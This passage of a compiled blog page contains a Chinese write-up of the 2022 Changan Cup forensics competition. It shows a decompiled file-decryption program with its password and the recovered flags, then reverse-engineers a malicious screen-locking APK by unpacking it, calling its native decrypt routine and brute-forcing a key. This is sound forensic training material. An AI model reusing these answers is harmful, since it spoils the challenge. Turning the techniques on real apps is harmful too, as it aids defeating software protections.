    print<span class="token punctuation">(</span><span class="token string">&#39;解密程序 V1.0\\n&#39;</span><span class="token punctuation">)</span>
    present = input<span class="token punctuation">(</span><span class="token string">&#39;请输入密码:&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> present == <span class="token string">&#39;4008003721&#39;</span>:
        <span class="token keyword">for</span> filepath<span class="token punctuation">,</span> dirnames<span class="token punctuation">,</span> filenames in os<span class="token punctuation">.</span>walk<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>:
            <span class="token keyword">for</span> filename in filenames:
                <span class="token keyword">if</span> <span class="token string">&#39;_encrypted&#39;</span> in filename:
                    print<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>filepath<span class="token punctuation">,</span> filename<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&#39;-解密成功&#39;</span><span class="token punctuation">)</span>
                    data_file = os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>filepath<span class="token punctuation">,</span> filename<span class="token punctuation">)</span>
                    data_handle = open<span class="token punctuation">(</span>data_file<span class="token punctuation">,</span> <span class="token string">&#39;rb&#39;</span><span class="token punctuation">)</span>
                    rsakey = RSA<span class="token punctuation">.</span>import_key<span class="token punctuation">(</span>prikey<span class="token punctuation">)</span>
                    cipher = Cipher_pkcs1_v1_5<span class="token punctuation">.</span>new<span class="token punctuation">(</span>rsakey<span class="token punctuation">)</span>
                    xor_key = cipher<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>data_handle<span class="token punctuation">.</span>read<span class="token punctuation">(</span>256<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">)</span>
                    xor_obj = XORCBC<span class="token punctuation">(</span>xor_key<span class="token punctuation">)</span>
                    outname = data_file<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&#39;_encrypted&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">)</span>
                    outf = open<span class="token punctuation">(</span>outname<span class="token punctuation">,</span> <span class="token string">&#39;wb&#39;</span><span class="token punctuation">)</span>
                    buffer_size = 4096
                    <span class="token keyword">while</span> True:
                        <span class="token keyword">data</span> = data_handle<span class="token punctuation">.</span>read<span class="token punctuation">(</span>buffer_size<span class="token punctuation">)</span>
                        <span class="token keyword">if</span> not <span class="token keyword">data</span>:
                            <span class="token keyword">break</span>
                        outf<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>xor_obj<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span><span class="token keyword">data</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

                    outf<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

        print<span class="token punctuation">(</span><span class="token string">&#39;\\n恭喜您，解密成功~~~~~~~~~~~~~~~&#39;</span><span class="token punctuation">)</span>
        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">&#39;pause&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span>:
        print<span class="token punctuation">(</span><span class="token string">&#39;\\n密码错误~~~~~~~~~~~~~~~&#39;</span><span class="token punctuation">)</span>
        run_decrypt<span class="token punctuation">(</span><span class="token punctuation">)</span>


run_decrypt<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># okay decompiling E:\\1762326648\\Deskop\\长安杯\\文件文档_20221101_142818\\火眼-文件导出\\decrypt_file.exe_extracted\\decrypt_file_1.pyc</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>随后得到的密码为：<code>4008003721</code></p><p>使用该密码解密</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101153933213.png" alt="image-20221101153933213" tabindex="0" loading="lazy"><figcaption>image-20221101153933213</figcaption></figure><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101153949542.png" alt="image-20221101153949542" tabindex="0" loading="lazy"><figcaption>image-20221101153949542</figcaption></figure><blockquote><p>FLAG1:TREFWGFS</p></blockquote><h2 id="apk分析-包子-写的" tabindex="-1"><a class="header-anchor" href="#apk分析-包子-写的" aria-hidden="true">#</a> APK分析（“包子”写的）</h2><h3 id="_46-恶意apk程序的包名为" tabindex="-1"><a class="header-anchor" href="#_46-恶意apk程序的包名为" aria-hidden="true">#</a> 46. 恶意APK程序的包名为</h3><p>雷电直接获取到包名</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101210423239.png" alt="image-20221101210423239" tabindex="0" loading="lazy"><figcaption>image-20221101210423239</figcaption></figure><h3 id="_47-apk调用的权限包括" tabindex="-1"><a class="header-anchor" href="#_47-apk调用的权限包括" aria-hidden="true">#</a> 47. APK调用的权限包括</h3><p>在静态权限中直接获取，也可在<code>AndroidManifest.xml</code>中得到</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101210731955.png" alt="image-20221101210731955" tabindex="0" loading="lazy"><figcaption>image-20221101210731955</figcaption></figure><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101210741809.png" alt="image-20221101210741809" tabindex="0" loading="lazy"><figcaption>image-20221101210741809</figcaption></figure><h3 id="_48-解锁第一关所使用的flag2值为" tabindex="-1"><a class="header-anchor" href="#_48-解锁第一关所使用的flag2值为" aria-hidden="true">#</a> 48. 解锁第一关所使用的FLAG2值为</h3><p>首先对APK进行脱壳处理。</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/3.png" alt="3" tabindex="0" loading="lazy"><figcaption>3</figcaption></figure><p>反编译后之后搜索FLAG，得到FLAG2</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101215745940.png" alt="image-20221101215745940" tabindex="0" loading="lazy"><figcaption>image-20221101215745940</figcaption></figure><h3 id="_49-解锁第二关所使用的flag3值为-flag为8位字符串-如需在apk中输入flag-请输入完整内容-如输入-flag9-qwert123" tabindex="-1"><a class="header-anchor" href="#_49-解锁第二关所使用的flag3值为-flag为8位字符串-如需在apk中输入flag-请输入完整内容-如输入-flag9-qwert123" aria-hidden="true">#</a> 49.解锁第二关所使用的FLAG3值为(FLAG为8位字符串，如需在apk中输入FLAG，请输入完整内容，如输入&quot;FLAG9:QWERT123&quot;)</h3><p>剖析apk发现</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token punctuation">(</span><span class="token punctuation">(</span>i2 <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>OooO0OO</span><span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token string">&quot;居然通过了第一关，不过还有第二关在等着你，现在你的手机在接下来的时间，会每隔一段时间关闭屏幕，请再次联系QQ:90001234进行解除，期间请勿尝试任何手段破解，否则将触发自毁程序&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>OooO0Oo</span><span class="token punctuation">.</span><span class="token function">setOnClickListener</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>OooO0o0</span><span class="token punctuation">.</span><span class="token function">setHint</span><span class="token punctuation">(</span><span class="token string">&quot;FLAG3:XXXXXXXX&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>OooO0o0</span><span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><code>((i2 &amp; 1) != 0)</code>对应了<code>FLAG2</code></p><p>不等于0时对应了FLAG3，所以FLAG3对应了如下内容</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">App<span class="token punctuation">.</span>OooO0O0<span class="token punctuation">.</span>OooO0oo</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>OooO0o0</span><span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name">App<span class="token punctuation">.</span>OooO0OO</span><span class="token punctuation">.</span><span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">putInt</span><span class="token punctuation">(</span><span class="token string">&quot;unlocked&quot;</span><span class="token punctuation">,</span> <span class="token class-name">App<span class="token punctuation">.</span>OooO0OO</span><span class="token punctuation">.</span><span class="token function">getInt</span><span class="token punctuation">(</span><span class="token string">&quot;unlocked&quot;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">commit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token class-name">StringBuilder</span> <span class="token class-name">OooO0OO2</span> <span class="token operator">=</span> <span class="token class-name">C0261o0000Oo<span class="token punctuation">.</span>OooO0OO</span><span class="token punctuation">(</span><span class="token class-name">App<span class="token punctuation">.</span>OooO0OO</span><span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">&quot;flag16_tkey&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token class-name">OooO0OO2</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token class-name">App<span class="token punctuation">.</span>OooO0O0<span class="token punctuation">.</span>OooO0oo</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">App<span class="token punctuation">.</span>OooO0OO</span><span class="token punctuation">.</span><span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">putString</span><span class="token punctuation">(</span><span class="token string">&quot;flag16_tkey&quot;</span><span class="token punctuation">,</span> <span class="token class-name">OooO0OO2</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">commit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token class-name">App<span class="token punctuation">.</span>OooO0Oo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;delay lock screen close&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token class-name">OooO00o</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>解析代码发现是把输入的值转为字符串之后，使用equals函数和前面的作比较，比较正确后返回<code>true</code>，所以<code>OooO0oo</code>应当是他所要对比的值，搜索在哪里对这个值进行了定义</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101230159603.png" alt="image-20221101230159603" tabindex="0" loading="lazy"><figcaption>image-20221101230159603</figcaption></figure><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>OooO0oo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token class-name">OooO0O0<span class="token punctuation">.</span>OooO0O0</span><span class="token punctuation">(</span><span class="token string">&quot;ffd4d7459ad24cd035611b014a2cccac&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>分析得到对<code>ffd4d7459ad24cd035611b014a2cccac</code>进行了两层加密，查找<code>OooO0O0</code>的用例</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token class-name">OooO0O0</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">int</span> length <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bArr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i2 <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> i2<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">int</span> i3 <span class="token operator">=</span> i2 <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span>
            bArr<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>i3<span class="token punctuation">,</span> i3 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> bArr<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>首先<code>ffd4d7459ad24cd035611b014a2cccac</code>是一个十六进制，将其转为数组，然后使用<code>decrypt</code>函数进行加密</p><p>分析<code>decrypt</code>函数</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code>    <span class="token keyword">public</span> <span class="token keyword">native</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bArr<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">native</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bArr<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">native</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bArr<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><code>init</code>函数调用了<code>libcipher.so</code>对密文进行了解密，与输入的值进行比较，最终判断是否正确</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101230636170.png" alt="image-20221101230636170" tabindex="0" loading="lazy"><figcaption>image-20221101230636170</figcaption></figure><p>所以将他执行的函数调用出来，执行一下，就可得到<code>OooO0O0</code>的输出，直接调用一个安卓的工程，把代码执行下来</p><p>APP.java如下：</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>hanshu</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">android<span class="token punctuation">.</span>app<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">android<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Log</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">App</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span> <span class="token punctuation">{</span>
    <span class="token keyword">static</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">loadLibrary</span><span class="token punctuation">(</span><span class="token string">&quot;cipher&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">native</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bArr<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">native</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bArr<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">native</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bArr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span>  <span class="token keyword">void</span>  <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token class-name">String</span> out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token class-name">OooO0O0</span><span class="token punctuation">(</span><span class="token string">&quot;ffd4d7459ad24cd035611b014a2cccac&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;ocipher:&quot;</span><span class="token operator">+</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token class-name">OooO0O0</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">int</span> length <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bArr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">int</span> i2 <span class="token operator">=</span> i <span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">;</span>
            bArr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>i2<span class="token punctuation">,</span> i2<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> bArr<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>最后连接模拟器，将此apk推送到模拟器中，查看日志，即可找到FLAG3</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/24.png" alt="24" tabindex="0" loading="lazy"><figcaption>24</figcaption></figure><h3 id="_50-解锁第三关所需的key值由ascii可显示字符组成-请请分析获取该key值" tabindex="-1"><a class="header-anchor" href="#_50-解锁第三关所需的key值由ascii可显示字符组成-请请分析获取该key值" aria-hidden="true">#</a> 50.解锁第三关所需的KEY值由ASCII可显示字符组成，请请分析获取该KEY值</h3><p>进入第三关，要输入Key值，查看代码</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/17.png" alt="17" tabindex="0" loading="lazy"><figcaption>17</figcaption></figure><p>找到(i2 &amp; 4) == 0的地方</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/18.png" alt="18" tabindex="0" loading="lazy"><figcaption>18</figcaption></figure><p>也是做了输入字符串的判断<br> 跳转到声明处，可以看到一系列比较复杂的算法</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/19.png" alt="19" tabindex="0" loading="lazy"><figcaption>19</figcaption></figure><p>思路是用键盘可输入的字符串制作字典，进行暴力破解<br> 再次使用Android Studio，编写代码，遍历六组数，通过算法，for循环，跑字典，算值，跑出有哪些字符可对应相应数组</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/20.png" alt="20" tabindex="0" loading="lazy"><figcaption>20</figcaption></figure><p>得到结果，按照六祖数的顺序，进行排序即可得到最终的key</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/21.png" alt="21" tabindex="0" loading="lazy"><figcaption>21</figcaption></figure><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/22.png" alt="22" tabindex="0" loading="lazy"><figcaption>22</figcaption></figure>`,74);function T(O,A){const s=p("ExternalLinkIcon");return o(),c("div",null,[d,u,r,n("p",null,[a("链接: "),n("a",L,[a("https://pan.baidu.com/s/1JWxtyhzmjZksAos2QUaWcw?pwd=wvk4"),e(s)])]),k,m,n("p",null,[a("VeraCrypt使用参考："),n("a",g,[a("Forensics-Wiki"),e(s)])]),b,n("h3",f,[U,a(" 8. 检材1中，网站前台页面里给出的APK的下载地址是（答案格式如下：“"),n("a",v,[a("https://www.forensix.cn/abc/def”"),e(s)]),a(")")]),N,n("p",null,[a("通过在github搜索"),n("a",h,[a("ZTuoExchange_framework"),e(s)]),a("发现符合本次比赛的案情。")]),y,n("p",null,[a("参考文章："),n("a",E,[a("https://www.jianshu.com/p/9f35a6f7ba05"),e(s)])]),_,n("p",null,[a("注意：如果参考文章中的下载后的文件执行命令后没有pyc后缀，请使用"),n("a",x,[a("Github的版本"),e(s)]),a("，可以直接生成pyc文件")]),w])}const I=i(l,[["render",T],["__file","2022changancup.html.vue"]]);export{I as default};
